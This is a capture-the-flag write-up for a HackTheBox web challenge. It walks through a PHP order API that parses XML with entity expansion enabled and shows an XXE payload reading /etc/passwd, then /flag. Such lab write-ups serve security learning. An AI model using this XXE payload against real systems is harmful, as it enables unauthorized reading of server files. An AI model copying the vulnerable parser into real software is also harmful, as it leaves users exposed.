# Challenge Description
Our WAFfles and ice scream are out of this world, come to our online WAFfles house and check out our super secure ordering system API!

# Analysis
To begin the challenge we visit the service IP and port provided on HTB.


Checking the page title gives away the actual exploitation path.

![WAF-1](https://user-images.githubusercontent.com/87711310/211150841-0ac2c969-6ff8-40fc-a848-98fc7eb1341c.png)

Now that we know the attack path we fire up `burpsuite` to intercept our order request. By making a post
request we see that our request is sent via a `json` request to the `api/order` endpoint.

Understanding what's happening here we check the `OrderController.php` provided by HTB.

```php
<?php
class OrderController
{
    public function order($router)
    {
        $body = file_get_contents('php://input');
        if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json')
        {
            $order = json_decode($body);
            if (!$order->food) 
                return json_encode([
                    'status' => 'danger',
                    'message' => 'You need to select a food option first'
                ]);
            return json_encode([
                'status' => 'success',
                'message' => "Your {$order->food} order has been submitted successfully."
            ]);
        }
        else if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/xml')
        {
            $order = simplexml_load_string($body, 'SimpleXMLElement', LIBXML_NOENT);
            if (!$order->food) return 'You need to select a food option first';
            return "Your {$order->food} order has been submitted successfully.";
        }
        else
        {
            return $router->abort(400);
        }
    }
}
```

So reviewing this code we see that we may either post to the API with `application/json` content type or we
may submit a `application/xml` content type. This is useful to know since we can leverage `XML injections` with
a specific XML formatted payload. By changing the content type in our `POST` request to `application/xml` and
then submitting a XML based payload with `order` and `food` as our entities, we can render the contents of
files within the system in our response.

You can learn more about XXE from [here](https://portswigger.net/web-security/xxe).

We can use the following code as a exploit for this exercise:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order>
<food>&xxe;</food>
</order>
```
![baby-WAFfle-order-1](https://user-images.githubusercontent.com/87711310/211150844-53dbef1b-d4cd-4452-beaf-adfab0562796.png)

But we don't know where the flag is at this stage. Taking a wild guess and trying different places we can
find the flag located at `/flag` and call this through our request to return the flag.

![baby-WAFfle-order-2](https://user-images.githubusercontent.com/87711310/211151014-29c15311-90e7-4187-8069-1fe413079bf4.png)

And we have obtained the flag!!!
